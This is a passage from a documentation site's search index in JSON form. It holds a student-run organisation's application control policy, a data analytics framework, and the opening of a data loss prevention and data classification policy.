{"searchDocs":[{"title":"Application control Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/application control policy","content":"","keywords":"","version":"Next"},{"title":"SCOPE​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#scope","content":" This Application Control Policy applies to all participants within Redback Operations, including students, mentors, tutors, and unit chairs. The policy is particularly relevant to the Cybersecurity Team, encompassing sub-teams such as SecDevOps, GRC, Blue Team, Red Team, and Infrastructure Team. It also extends to all project-based teams working on initiatives such as VR SunCycle, Elderly Wearable Technology, Athlete Wearable Technology, Player Tracking, and BugBox. The policy covers all digital environments, including virtual machines (VMs), cloud services, and various tools used for project work and cybersecurity operations.  ","version":"Next","tagName":"h3"},{"title":"PURPOSE​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#purpose","content":" The Application Control Policy establishes a framework for managing, approving, and monitoring the software applications used within Redback Operations. This policy aims to prevent unauthorized or malicious software from being used, thereby protecting the integrity of the digital environment and ensuring compliance with internal and external security standards. By enforcing controlled application usage, this policy supports the secure execution of all project and cybersecurity activities.  ","version":"Next","tagName":"h3"},{"title":"OBJECTIVES​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#objectives","content":" The objectives of this Application Control Policy are to:  Enhance Security Posture: Safeguard Redback Operations against the risks posed by unauthorized or malicious software.Ensure Compliance: Align with legal, regulatory, and internal security standards related to software usage.Maintain Operational Integrity: Ensure that only authorized and tested applications are used, preserving the stability and reliability of digital environments.Support Incident Response: Provide clear procedures for handling incidents involving unauthorized applications.  ","version":"Next","tagName":"h3"},{"title":"DEFINITIONS​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#definitions","content":" Term\tDefinitionApplication Control\tA security measure that restricts the execution of unauthorized software to mitigate risks associated with malware and other security threats. Whitelisting\tThe practice of allowing only pre-approved software applications to be executed within the digital environment. Blacklisting\tThe process of blocking known malicious or unapproved software from being executed. Virtual Machine (VM)\tA software-based environment that emulates a physical computer, allowing users to run applications and perform tasks in an isolated digital space. Critical Applications\tSoftware that is essential for the execution of specific project tasks, cybersecurity operations, or overall organizational activities.  ","version":"Next","tagName":"h3"},{"title":"Guiding Principles​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#guiding-principles","content":" Principle\tDescriptionSecurity\tProtect the digital environment by ensuring that only secure and authorized software applications are used. Compliance\tAdhere to applicable regulations, internal policies, and industry standards related to software management and control. Operational Efficiency\tEnsure that the application control measures support productivity without compromising security. Transparency\tMaintain clear documentation and processes for the approval, management, and monitoring of applications.  ","version":"Next","tagName":"h3"},{"title":"APPLICATION CONTROL PROCEDURES​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#application-control-procedures","content":" Application Approval and Whitelisting  Application Submission: Participants who require new software for their tasks must apply request to the IT Support Team or Security Team. The request must include the application's name, purpose, source, and justification for its use.Evaluation Criteria: The IT or Security Team will evaluate the requested application based on: Security: The application's security features, such as encryption, patch history, and vendor reputation.Compatibility: Compatibility with existing systems, VMs, and digital environments.Compliance: Adherence to licensing agreements, regulations, and internal policies.Operational Need: The application's relevance to the project or task at hand. Approval Process: Upon successful evaluation, the application will be approved and added to the whitelist, allowing it to be installed and executed within Redback’s digital environment.Whitelisting Management: The whitelist of approved applications will be maintained by the IT Support Team and reviewed periodically to ensure it remains up-to-date and relevant.  Blacklisting and Unauthorized Applications  Identifying Threats: Any application identified as malicious, unauthorized, or irrelevant to project work will be added to the blacklist by the Security Team. This includes applications flagged during monitoring, audits, or by third-party security advisories.- - - - Blocking Execution: Blacklisted applications are automatically blocked from being executed on any system within the Redback digital environment, including VMs and personal devices used for project work.Responding to Violations: If an attempt to execute a blacklisted or unauthorized application is detected, the incident must be reported immediately to the Security Team. The involved system will be isolated, and an investigation will be conducted to determine the cause and impact.  Continuous Monitoring and Logging  Application Monitoring: The Security Team must continuously monitor application usage across all systems, VMs, and digital environments. This includes monitoring the installation, execution, and update activities of all applications.Log Management: All application-related activities must be logged, including successful and unsuccessful attempts to install, execute, or update applications. These logs will be integrated into the SIEM (Security Information and Event Management) system for real-time analysis and long-term storage.Anomaly Detection: The SIEM system will be configured to detect anomalies, such as attempts to run unauthorized software, unusual patterns in application usage, or potential security breaches. Alerts will be generated and reviewed by the Security Team.  Software Updates and Patching  Regular Updates: All approved applications must be kept up to date with the latest security patches and updates. The IT Support Team is responsible for scheduling and applying these updates across all relevant systems.Controlled Rollout: Before deploying updates or new applications, they must be tested in a controlled environment, such as a dedicated VM, to ensure compatibility and security. Only after successful testing will the updates be rolled out to the broader digital environment.Patch Management: A patch management schedule will be maintained, ensuring that all critical updates are applied promptly, and that legacy applications are reviewed for potential security risks.  ","version":"Next","tagName":"h3"},{"title":"APPLICATION USAGE IN SPECIFIC TEAMS​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#application-usage-in-specific-teams","content":" SecDevOps Team  Development Tools: All development tools, IDEs (Integrated Development Environments), and CI/CD (Continuous Integration/Continuous Deployment) pipelines must be approved through the whitelisting process. Regular code reviews and security scans must be conducted using approved tools.Containerization: Any containers or containerized applications must be built using approved base images, and all containers must be scanned for vulnerabilities before deployment.  GRC Team  Compliance Tools: All tools used for governance, risk management, and compliance activities must adhere to regulatory requirements. The GRC Team must ensure that only compliant software is used, and that all usage is documented for audit purposes.  Blue Team  Defensive Tools: Tools such as SIEM, Wazuh, Nagios, and endpoint protection software must be carefully configured and regularly updated to protect the environment. The Blue Team is responsible for monitoring these tools and ensuring they operate within approved parameters.  Red Team  Pentesting Applications: All penetration testing tools must be pre-approved and isolated within dedicated VMs. The Red Team must document all activities and ensure that no residual data or tools are left behind after testing.Tool Security: Red Team tools must be securely stored, with access restricted to authorized participants. Any new tools or updates must go through the standard approval process before use.  Infrastructure Team  Infrastructure Management Tools: All tools used for managing servers, VMs, network devices, and cloud services must be approved and configured securely. The Infrastructure Team is responsible for ensuring that these tools do not introduce vulnerabilities into the environment.Patch Management: The Infrastructure Team must coordinate with the IT Support Team to ensure that all infrastructure-related applications and tools are kept up-to-date and secure.  Compliance and Auditing  Regular Audits: The Security Team must conduct regular audits to ensure compliance with the Application Control Policy. Audits will include a review of the application whitelist and blacklist, an analysis of logs, and a check for unauthorized software.Policy Violations: Any violation of the Application Control Policy, whether intentional or unintentional, must be reported immediately. Consequences for violations may include restricted access to systems, additional training, or disciplinary action, depending on the severity.  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#roles-and-responsibilities","content":" Role\tResponsibilityParticipants\tAdhere to the policy, use only authorized applications, and report any issues or violations immediately. IT Support Team\tManage the application whitelist and blacklist, handle approval requests, apply updates, and monitor compliance. Security Team\tMonitor application usage, conduct regular audits, manage incident response, and maintain SIEM integration for application control. Team Leaders and Mentors\tEnsure that participants understand and comply with the Application Control Policy and support the approval process for necessary tools. CISO\tOversee the application control framework, ensure alignment with security goals, and lead the review and update process for the policy.  ","version":"Next","tagName":"h3"},{"title":"REVIEW AND UPDATES​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#review-and-updates","content":" This policy will be reviewed annually, or as needed based on changes in technology, security threats, or project requirements. The CISO will initiate reviews in collaboration with the IT Support and Security Teams, ensuring the policy remains relevant and effective.  ","version":"Next","tagName":"h3"},{"title":"KEY ASSETS AND DATA CATEGORIES​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#key-assets-and-data-categories","content":" IT Assets:  Laptops (Windows, Linux)Virtual Machines (VMs)Cloud Services and infrastructureSIEM, Wazuh, Nagios, and other monitoring tools  Data Categories:  Project data across various teams (e.g., VR SunCycle, Elderly Wearable Technology)Application usage logs and security incident reportsCompliance records related to software usage  ","version":"Next","tagName":"h3"},{"title":"FRAMEWORK REFERENCES​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#framework-references","content":" This policy aligns with recognized standards and best practices, including:  ISO 27001:2022 Controls: Covering secure software management, access control, and operations security.CIS Controls: Addressing secure configuration, continuous vulnerability management, audit log management, and incident response.  ","version":"Next","tagName":"h3"},{"title":"CONCLUSION​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#conclusion","content":" This Application Control Policy is designed to ensure that Redback Operations maintains a secure and compliant digital environment. By controlling the software applications used within the organization, this policy supports the secure execution of projects and cybersecurity operations, while protecting against unauthorized or malicious software.  ","version":"Next","tagName":"h3"},{"title":"Appendix​","type":1,"pageTitle":"Application control Policy","url":"/redback-documentation/docs/company-policy/application control policy#appendix","content":" For additional guidelines and best practices, refer to the following resources:&quot;Australian Signals Directorate, Guidelines for System Hardening, May 12, 2024&quot; ","version":"Next","tagName":"h3"},{"title":"Data Analytics Framework","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/data-analytics-framework","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#introduction","content":" The purpose of this framework is to provide a structured approach to harnessing the power of data in making informed decisions. It serves as a comprehensive guide for Redback Operations project teams to systematically navigate through the complex process of collecting, processing, analysing, and interpreting data. By setting out clear steps and methodologies, this framework ensures that data analytics initiatives are aligned with the overarching goals of Redback Operations, whether they are business-driven objectives or research-oriented inquiries.  The framework acts as a blueprint for consistency and efficiency in handling data. It helps in establishing best practices, ensuring data quality and integrity, and fostering a data-driven culture within the organisation. It also aids in mitigating risks associated with data management, such as data breaches or compliance issues, by embedding necessary protocols and ethical guidelines. Ultimately, this framework aims to empower projects teams to unlock actionable insights from data, leading to more strategic decisions, and enhanced performance in their respective fields.  ","version":"Next","tagName":"h2"},{"title":"1. Define Objectives and Questions​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#1-define-objectives-and-questions","content":" ","version":"Next","tagName":"h2"},{"title":"Identify the Business or Research Objectives​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#identify-the-business-or-research-objectives","content":" Understanding the Context Begin by comprehensively understanding the context in which the data analytics will be applied. This could be a business setting, a research environment, or any other scenario where data is crucial. Aligning with Redback Operational Goals Ensure that the objectives of data analytics are aligned with the broader goals of Redback Operations. This alignment guarantees that the outcomes will be relevant and valuable. Objective Setting Clearly define what you want to achieve through data analytics. These objectives could range from improving the project performance, predicting certain outcomes, to solving specific research questions.  ","version":"Next","tagName":"h3"},{"title":"Formulate Specific Questions that Data Analytics Can Answer​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#formulate-specific-questions-that-data-analytics-can-answer","content":" Breaking Down Objectives into Questions Translate each objective into one or more specific questions that data analytics can address. For instance, if the objective is to improve runner performance, potential questions could be, &quot;What factors most influence an athlete’s running performance?&quot; Feasibility and Relevance of Questions Assess the feasibility of answering these questions with available data. Ensure that the questions are not only answerable but also relevant to the objectives. SMART Criteria Apply the SMART criteria to these questions - Specific, Measurable, Achievable, Relevant, and Time-bound. This ensures that each question is well-defined and can guide focused analysis. Prioritising Questions In cases where multiple questions are identified, prioritise them based on factors like their impact on the objectives, data availability, and the resources required for analysis.  ","version":"Next","tagName":"h3"},{"title":"Collaborative Input​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#collaborative-input","content":" Stakeholder Engagement Involve key stakeholders in the process of defining objectives and formulating questions. This may include the Project Director, Mentors, Project, and Tech Leads. Their insights can provide valuable perspectives and ensure that the analytics efforts are closely aligned with user needs and expectations. Feedback Loop Establish a feedback loop where initial objectives and questions can be refined and iterated upon based on stakeholder input and preliminary findings.  ","version":"Next","tagName":"h3"},{"title":"Documentation and Communication​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#documentation-and-communication","content":" Clear Documentation Document the defined objectives and questions clearly. This documentation should be accessible to all team members and stakeholders involved in the data analytics process. Setting the Foundation for Analytics Work Use this documentation as a foundational guide for subsequent steps in the data analytics process, ensuring that all efforts are geared towards answering these questions and achieving the set objectives.  ","version":"Next","tagName":"h3"},{"title":"2. Data Collection​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#2-data-collection","content":" ","version":"Next","tagName":"h2"},{"title":"Establish Methods for Data Collection​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#establish-methods-for-data-collection","content":" Identifying Data Sources Begin by identifying potential data sources relevant to your objectives and questions. These could include internal sources generated from other projects or external sources like public datasets. Selection of Data Collection Methods Choose appropriate data collection methods based on your objectives and the nature of your data. This could range from sourcing data from IoT devices to utilising data mining techniques and APIs for extracting large volumes of quantitative data. Integrating Diverse Data Sources Plan for the integration of data from various sources, ensuring compatibility and coherence in the data collection process.  ","version":"Next","tagName":"h3"},{"title":"Ensure Data Quality and Integrity​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#ensure-data-quality-and-integrity","content":" Data Quality Checks Implement processes to regularly check the quality of data. This includes verifying the accuracy, completeness, consistency, and reliability of the data collected. Data Cleaning Develop protocols for cleaning and preprocessing data to remove errors, duplicates, and irrelevant information. Maintaining Data Integrity Establish guidelines to ensure that data is not altered in an unauthorised or unintended manner during its lifecycle.  ","version":"Next","tagName":"h3"},{"title":"3. Data Processing and Storage​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#3-data-processing-and-storage","content":" ","version":"Next","tagName":"h2"},{"title":"Clean and Preprocess Data​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#clean-and-preprocess-data","content":" Data Cleaning Engage in thorough data cleaning to address issues such as inconsistencies, missing values, and errors. This process includes techniques like imputation for missing data, correcting erroneous entries, and standardising data formats. Preprocessing Techniques Apply appropriate preprocessing techniques to make the data suitable for analysis. This might involve normalisation, transformation, feature extraction, and handling of categorical data.  ","version":"Next","tagName":"h3"},{"title":"Choose Appropriate Storage Solutions​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#choose-appropriate-storage-solutions","content":" Assessment of Data Storage Needs Evaluate the nature and volume of data to determine the most suitable storage solution. Consider factors like the size of datasets, frequency of access, and security requirements. Databases and Data Warehouses For structured data requiring frequent, transactional processing, relational databases may be ideal. For larger, more complex datasets involving extensive querying and reporting, data warehouses are a better fit. Cloud Storage Options Consider cloud storage solutions for their scalability and flexibility. Cloud services often provide robust and cost-effective options for storing large amounts of data. Hybrid Solutions A hybrid approach that combines on-premises storage with cloud solutions might be optimal, especially where there are concerns over data security or compliance requirements.  ","version":"Next","tagName":"h3"},{"title":"Data Integration​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#data-integration","content":" Combining Data from Various Sources Employ strategies to integrate data from various sources, ensuring a comprehensive dataset for analysis.  ","version":"Next","tagName":"h3"},{"title":"Data Security and Backup​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#data-security-and-backup","content":" Ensuring Data Security Implement robust security measures to protect data during processing and storage. Regular Backups Maintain a routine of regular backups to prevent data loss.  ","version":"Next","tagName":"h3"},{"title":"Compliance and Data Sovereignty​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#compliance-and-data-sovereignty","content":" Adhering to Compliance Regulations Stay vigilant about compliance with any relevant data protection and privacy laws. Data Sovereignty Considerations Be mindful of data sovereignty issues, especially when storing data in the cloud.  ","version":"Next","tagName":"h3"},{"title":"4. Data Exploration and Analysis​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#4-data-exploration-and-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Perform Exploratory Data Analysis to Understand Patterns and Anomalies​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#perform-exploratory-data-analysis-to-understand-patterns-and-anomalies","content":" Initial Data Exploration Start with exploratory data analysis (EDA) to gain a sense of the data distribution. Pattern Identification Use EDA to identify patterns, trends, and correlations. Anomaly Detection Identify outliers and anomalies to understand deviations. Data Quality Assessment Assess data quality, missing values, and inconsistencies.  ","version":"Next","tagName":"h3"},{"title":"Select Suitable Analytical Techniques​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#select-suitable-analytical-techniques","content":" Analytical Technique Selection Select analytical techniques based on insights from EDA. Combination of Techniques Use combinations of techniques to validate hypotheses and conduct deeper analyses. Advanced Techniques Utilise advanced techniques like Natural Language Processing (NLP), used to deal with speech patterns and AI speech recognition, or neural networks if necessary. Iterative Approach Refine techniques and methodologies as needed.  ","version":"Next","tagName":"h3"},{"title":"Validation and Testing​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#validation-and-testing","content":" Model Validation Conduct rigorous validation of predictive models. Hypothesis Testing Use statistical tests to validate hypotheses. Reproducibility Ensure analysis is reproducible.  ","version":"Next","tagName":"h3"},{"title":"5. Data Visualisation and Reporting​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#5-data-visualisation-and-reporting","content":" ","version":"Next","tagName":"h2"},{"title":"Use Tools for Data Visualisation to Interpret the Results​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#use-tools-for-data-visualisation-to-interpret-the-results","content":" Selection of Visualisation Tools Choose visualisation tools based on the insights needed. Effective Visualisations Create graphs, charts, and other visual representations to convey key findings. Ensure each visualisation includes a descriptive title and labeled axes to clearly indicate what the data represents, enhancing understanding and readability.  ","version":"Next","tagName":"h3"},{"title":"Create Reports and Dashboards for Communicating Findings​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#create-reports-and-dashboards-for-communicating-findings","content":" Report Design Design comprehensive reports that present visualisations with context and interpretation. Interactive Dashboards Develop interactive dashboards to dynamically explore data. Consistency and Clarity Maintain consistency in reports and dashboards.  ","version":"Next","tagName":"h3"},{"title":"6. Implementation of Insights​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#6-implementation-of-insights","content":" ","version":"Next","tagName":"h2"},{"title":"Translate Data-Driven Insights into Actionable Strategies or Decisions​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#translate-data-driven-insights-into-actionable-strategies-or-decisions","content":" Understanding Insights Interpret insights carefully to understand their implications. Strategy Development Develop strategies to drive positive outcomes.  ","version":"Next","tagName":"h3"},{"title":"Collaborate with Relevant Stakeholders​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#collaborate-with-relevant-stakeholders","content":" Engaging Stakeholders Ensure stakeholders at all levels understand the new strategies. Cross-Functional Teams Form cross-functional teams to implement strategies.  ","version":"Next","tagName":"h3"},{"title":"7. Evaluation and Iteration​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#7-evaluation-and-iteration","content":" ","version":"Next","tagName":"h2"},{"title":"Assess the Impact of Implemented Strategies​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#assess-the-impact-of-implemented-strategies","content":" Performance Metrics Establish metrics to measure the impact of strategies. Regular Review Conduct regular assessments of strategies' effectiveness.  ","version":"Next","tagName":"h3"},{"title":"Continuously Iterate the Process Based on Feedback and Changing Needs​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#continuously-iterate-the-process-based-on-feedback-and-changing-needs","content":" Feedback Integration Collect and integrate feedback from stakeholders and performance metrics. Adaptive Approach Be ready to adapt strategies in response to new information.  ","version":"Next","tagName":"h3"},{"title":"8. Data Governance and Compliance​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#8-data-governance-and-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"Ensure Data Security and Privacy​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#ensure-data-security-and-privacy","content":" Data Security Measures Implement security measures to protect data. Privacy Protocols Establish protocols to ensure data privacy.  ","version":"Next","tagName":"h3"},{"title":"Comply with Relevant Data Protection Regulations​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#comply-with-relevant-data-protection-regulations","content":" Regulatory Compliance Stay informed and compliant with data protection laws. Regular Audits Conduct regular audits to ensure compliance.  ","version":"Next","tagName":"h3"},{"title":"9. Technology and Tools​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#9-technology-and-tools","content":" ","version":"Next","tagName":"h2"},{"title":"Identify and Utilise Appropriate Tools and Technologies for Each Stage​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#identify-and-utilise-appropriate-tools-and-technologies-for-each-stage","content":" Tool Selection for Different Stages Choose the right tools for different stages of data analytics. Integration of Tools Ensure tools integrate well with each other.  ","version":"Next","tagName":"h3"},{"title":"Keeping Up to Date with Advancements​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#keeping-up-to-date-with-advancements","content":" Continuous Learning Stay updated on the latest technology developments. Training and Development Invest in training and development opportunities.  ","version":"Next","tagName":"h3"},{"title":"10. Documentation and Knowledge Management​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#10-documentation-and-knowledge-management","content":" ","version":"Next","tagName":"h2"},{"title":"Document Processes, Methodologies, and Findings​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#document-processes-methodologies-and-findings","content":" Clear Documentation Maintain thorough documentation of data processes and methodologies. Standardised Documentation Practices Ensure consistency in documentation practices.  ","version":"Next","tagName":"h3"},{"title":"Develop a System for Knowledge Sharing and Collaboration​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#develop-a-system-for-knowledge-sharing-and-collaboration","content":" Knowledge Management System Capture all documentation in the project's repository. Encouraging Collaboration Encourage collaboration to build a collective knowledge base.  ","version":"Next","tagName":"h3"},{"title":"11. Scalability and Maintenance​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#11-scalability-and-maintenance","content":" ","version":"Next","tagName":"h2"},{"title":"Plan for Scalability to Handle Increased Data Volume or Complexity​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#plan-for-scalability-to-handle-increased-data-volume-or-complexity","content":" Scalable Systems Ensure data systems can accommodate growing data volumes. Futureproofing Regularly evaluate infrastructure for future readiness.  ","version":"Next","tagName":"h3"},{"title":"Establish Regular Maintenance and Updates of Data, Models, and Systems​","type":1,"pageTitle":"Data Analytics Framework","url":"/redback-documentation/docs/company-policy/data-analytics-framework#establish-regular-maintenance-and-updates-of-data-models-and-systems","content":" Routine Maintenance Schedule regular maintenance of data sources and models. Updating Models and Systems Regularly update predictive models and systems. ","version":"Next","tagName":"h3"},{"title":"DLP & Data Classification Policies","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#purpose","content":" The purpose of this DLP &amp; Data Classification Policy is to ensure that all possible protective measures are followed to ensure the integrity, confidentiality and overall safety of Redback Operations’ assets and sensitive information. Though the measures within this policy should be regularly audited and checked for compliance to guarantee the company’s digital safety.  ","version":"Next","tagName":"h2"},{"title":"Data Classification​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#data-classification","content":" To ensure the safety and integrity of our data, we must deploy a range of carefully illustrated Data Classification Policies, which must be adhered to, to protect sensitive information in the event of a data breach.  Data Classification Policies are designed to categorise and prioritise data based on factors such as its sensitivity, importance, and its impact on the business. This categorisation can influence the appropriate storage, encryption, and access requirements for different types of data, ensuring the protection of sensitive information. Though these Data Classification policies must work in tandem with our DLP (Data Loss Prevention) policies, which are designed to identify, monitor, and mitigate risks to effectively safeguard our data.  This report will examine and explain the principles that Redback Operations must follow to effectively categorise and classify their data, ensuring the confidentiality and integrity of our data assets.  ","version":"Next","tagName":"h2"},{"title":"Sensitivity​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#sensitivity","content":" Sensitivity refers to the level of confidentiality or privacy associated with the data, indicating how critical it is to protect against unauthorized access or disclosure. Data that may be considered sensitive includes all types of personally identifiable information, such financial information, records, customer information (names, addresses, etc.). Sensitive information like this must be classified as somewhat restricted information, where only those required to access it, can do so. This can be done through the DLP policy of Access Controls.  Alternatively, non-sensitive data refers to data that does not pose any significant risks or impacts if unauthorized parties access it. Information that may be classified as non-sensitive include public business information, such as publicised business trends, general contact information or press releases. Additionally, non-identifiable data, such as anonymous customer feedback or statistical reports can also be classified as non-sensitive.  Though sensitive data must be treated as a top priority for safety, meaning access controls, encryption and proper storage of this data must take place.  ","version":"Next","tagName":"h3"},{"title":"Importance​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#importance","content":" Importance refers to the direct or significant of data to the business’ operations, strategic objectives, or regulatory compliance requirements. Data that may be considered important include customer databases, the company’s intellectual property, business continuity documents (for future projects/campaigns) and regulatory compliance documents. Additionally, business contingency and emergency response plans must be categorised with high importance, so the documentation is easily accessible in the event of an emergency.  On the other hand, data that may be considered non-important typically includes information that is not directly relevant or critical to the business. For example, outdated data, outdated data trends, non-strategic business information, such as general industry news and general employee training information.  Ultimately, data that is considered highly important must be treated with absolute care to ensure the business’ integrity and continuity.  ","version":"Next","tagName":"h3"},{"title":"Business Impact​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#business-impact","content":" Business Impact refers to the potential consequences that could result from the loss, compromise, or unauthorized access of data, including financial losses, reputational damage, and operational disruptions. Data that may be classified as a high business impact involves any critical set of data to the company, such as customer/employee personal information, financial forecasts, and business continuity plans.  Data classified to have a high business impact if compromised should be treated with the highest level of care, meaning secure backups must be created on top of the already secure DLP policies.  On the contrary, data that may be classified as having a low business impact if compromised may include outdated marketing materials, redundant/old data, employee training materials, non-sensitive employee feedback.  Though data may be classified to have a low business impact if compromised, it still should be adequately protected and taken care of, as over time the data may eventually be considered to have a high business impact if its context or business strategies change.  ","version":"Next","tagName":"h3"},{"title":"Data Classification Summary​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#data-classification-summary","content":" Adhering to the previous categories, data can be classified amongst four levels: Public, Internal Use Only, Confidential, and Restricted.  Public: Data intended for public disclosure. Encryption is not required for public data, but best practices for integrity should still be applied. Internal Use Only: Data that is not sensitive but is intended for use within the organization. Basic encryption controls are recommended to prevent unauthorized disclosure. Confidential: Sensitive data that could cause harm to the organization or individuals if disclosed. Encryption in transit and at rest, using industry-standard algorithms and key strengths, is required. Restricted: Highly sensitive data that if disclosed could result in significant harm or legal/regulatory non-compliance. Strong encryption, both in transit and at rest, with strict access controls and key management procedures, is mandatory.  To conclude, though all unreleased data must be protected from the public eye, data that may be considered to have a higher value to the company (sensitivity, importance, business impact) should be firmly treated with the company’s DLP policies, such as proper storage, encryption, backups, and internal access controls to help mitigate any potential breaches of data within RedBack Operations.  ","version":"Next","tagName":"h3"},{"title":"DLP Policies​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#dlp-policies","content":" To ensure the safety and integrity of our data, we must deploy a range of safety measures and policies to accurately respond in the event of a data breach.  DLP policies are designed to proactively identify, monitor, and mitigate risks involved with unauthorized access, data distribution or breaches of sensitive data. Though these DLP (Data Loss Prevention) policies must work in tandem with our Data Classification policies, which categorise data based on its importance and sensitivity to the company. When these are aligned and our ISMS are adhered to, a comprehensive approach can be taken to ensure the safety and protection of our data assets.  This report will examine and explain the principles, strategies, and implementation of DLP policies within Redback Operations. By adhering to all policies, we can boost our defence against data breaches and data loss, thus ensuring the integrity of our data assets.  ","version":"Next","tagName":"h2"},{"title":"Data Classification​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#data-classification-1","content":" Adhering to the Data Classification Policy (listed above), data must be classified based on its sensitivity, importance, and business impact to RedBack Operations. Data is classified by three levels: Public, Internal Use Only, Confidential and Restricted. Data that is classified as “restricted” and “confidential” must be treated with absolute care, and all protection and prevention measures possible (as listed in this document) must take place to ensure the protection and integrity of the data. Though the “public” and “internal use only” levels still must be treated with a high level of care, despite not being as sensitive or important to the company.  ","version":"Next","tagName":"h3"},{"title":"Access Controls​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#access-controls","content":" Access controls must be established to ensure the protection of sensitive data. 